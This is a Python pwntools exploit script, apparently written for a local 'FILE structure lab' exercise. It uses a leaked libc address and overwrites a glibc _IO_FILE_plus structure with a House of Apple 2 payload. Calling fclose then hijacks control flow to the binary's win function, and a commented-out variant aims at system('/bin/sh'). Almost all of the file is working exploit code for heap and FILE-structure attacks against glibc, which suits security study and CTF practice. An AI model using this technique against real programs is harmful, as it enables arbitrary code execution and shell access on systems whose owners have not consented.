#!/usr/bin/env python3

import pwn
import sys
from house_of_apple2 import HouseOfApple2

bin_filename = "/lab/target"
bin_elf = pwn.ELF(bin_filename)
libc_elf = bin_elf.libc

gdbscript = """
break *main
break *win
continue
"""


def get_libc(p):
    p.recvuntil(b"libc base = ")
    libc_elf.address = int(p.recvline()[:-1], 16)
    print(f"libc base: {libc_elf.address:#x}")


def hijack_fclose(p, target_func, arg=None):
    # open a file
    p.recvuntil(b"=== FILE structure lab ===")
    p.sendline(b"1")
    p.recvline()
    p.sendline(b"0")
    p.recvuntil(b"fopen(")
    p.recvuntil(b" = ")
    fp = int(p.recvline()[:-1], 16)
    print(f"fp @ {fp:#x}")

    # corrupt the _IO_FILE_plus struct
    p.recvuntil(b"=== FILE structure lab ===")
    p.sendline(b"6")
    p.recvline()
    p.sendline(b"0")
    p.recvuntil(b"[*] reading")

    _IO_wfile_jumps = libc_elf.symbols["_IO_wfile_jumps"]
    ptr_to_zero = bin_elf.bss(0xa00)
    hoa2 = HouseOfApple2(_IO_wfile_jumps, ptr_to_zero)
    payload = hoa2.fclose_payload(fp, target_func, arg)
    p.send(payload)

    # execute fclose to trigger the arbitrary call
    p.recvuntil(b"=== FILE structure lab ===")
    p.sendline(b"4")
    p.recvline()
    p.sendline(b"0")
    p.recvline()


def main():
    if "--gdb" in sys.argv:
        p = pwn.gdb.debug(
            bin_filename,
            env={},
            gdbscript=gdbscript
        )
    else:
        p = pwn.process(
            bin_filename,
            env={}
        )

    get_libc(p)

    # fclose is calling _IO_wfile_overflow, but at some point in _IO_file_close_it it modifies _flags, overwriting our first arg.
    # we won't be able to control the first argument with this execution path.
    # https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/fileops.c#L158

    #hijack_fclose(
    #    p,
    #    libc_elf.symbols["system"],
    #    b"/bin/sh"
    #)
    #p.sendline(b"ls -la /")

    hijack_fclose(
        p,
        bin_elf.symbols["win"],
    )

    p.interactive()


if __name__ == "__main__":
    main()
